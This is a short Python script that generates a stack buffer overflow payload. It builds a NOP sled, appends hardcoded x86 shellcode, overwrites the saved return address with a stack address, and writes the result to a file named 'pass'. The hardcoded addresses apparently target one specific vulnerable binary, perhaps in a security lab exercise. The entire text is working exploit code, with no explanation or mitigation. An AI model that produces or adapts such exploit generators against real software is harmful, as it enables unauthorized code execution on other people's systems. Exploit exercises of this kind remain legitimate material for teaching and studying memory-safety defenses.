 shellcode=(
     "\x6A\x14\x58\x6A\x0A\x5B\xF7\xE3\xF7\xE3\x83\xC0\x05\xF7\xE3\xF7\xE3\xF7\xE3\x6A\x11\x59\x01\xC8\x68\xAD\xDE\xED\xFE\x50\xBB\x8D\x62\x55\x56\xFF\xD3\xBB\xE3\x62\x55\x56\xFF\xD3"
        ).encode('latin-1'   )

filelen=285
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(filelen)) 
# Put the shellcode at the end 
start = filelen - len(shellcode) 
content[start:] = shellcode 
 
ebp=0xffffd298
ret = ebp + 50
d=193
L=4
offset=d+L
content[offset:offset+L] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('pass', 'wb') as f: 
    f.write(content)

